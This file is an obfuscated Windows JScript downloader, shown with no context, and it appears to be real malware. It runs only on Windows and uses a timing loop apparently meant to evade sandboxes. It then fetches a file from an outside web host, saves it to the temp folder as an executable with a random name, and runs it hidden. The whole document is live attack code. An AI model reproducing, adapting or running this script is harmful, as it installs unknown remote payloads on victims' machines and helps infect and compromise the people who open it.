var _WY = false;
var _U = "CreateObject";
var _J0 = function _M() {return WScript[_U]("WScript"+".Shell");}(), _HL = 11;
var _DE0 = "MSXML2.XMLHTTP";
var _NY = 2123213;
var _SH = 0;
function _YU(_C0){_J0["Run"](_C0, _SH, _SH);};
function _R(){return _DE0 + "";};
function _R0(_ES, _TO){_SH = _SH * 1; return _ES - _TO;};
function _C(){return _U;};
/*@cc_on
  @if (@_win32 || @_win64)
    _WY = true;
  @end
@*/
if (_WY)
{
var _M0 = "";
function _GQ(){return 22;};
var _GT = 0; var _N = 0;
function _ER()
{
var _SD = new this["Date"]();
var _Q = _SD["getUTCMilliseconds"]();
WScript["Sleep"](_GQ());
var _SD = new this["Date"]();
var _ZH = _SD["getUTCMilliseconds"]();
WScript["Sleep"](_GQ());
var _SD = new this["Date"]();
var _DE = _SD["getUTCMilliseconds"]();
var _GT = "_R1";
_GT = _R0(_ZH, _Q);
var _N = "_WM";
_N = _R0(_DE, _ZH);
_M0 = "open";
return _R0(_GT, _N);
}
var _J = false;
var _DF = false;
for (var _W = _SH; _W < _GQ() * 1; _W++){if (_ER() != _SH){
_J = true; 
_N = "31" + 11 * _GT + _N; 
_DF = true; 
break;
}}
function _B() {return ((_J == true) && (_J == _DF)) ? 1 : _SH;};
if (_J && _B() && _DF){
function _IF() {return _J0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7ZoFzAMCj.ex" + "e";};
 _YC = _R();
 _IX = WScript[_U](_YC);
 var _B0 = 1;
 while (_B0){
try {
	if (_B0 == 1)
	{
		_IX[_M0]("GET", "http://goldish.dk/o2pds", false);
		_IX["send"]();
		_E0 = "Sleep";
	}
	WScript[_E0](_GQ() + 120); 
	if (_IX["readystate"] < 2 * 2) continue;
	_B0 = _SH;
	function _LR(_G) {var _E = (1, 2, 3, 4, 5, _G); return _E;};
	_N0 = WScript[_C()]("ADODB.Stream");
	_YC = _N0;
	_YC[_M0]();
	_YC["type"] = _LR(1);
	_YC["write"](_IX["ResponseBody"]);
	_N0["position"] = _LR(_SH);
	_YC["Save" + "ToFile"](_IF(), 2);
	_N0["cl"+"ose"]();
	_V = _IF();
	_YU(_V);
} catch(_Y){};
}
}
}

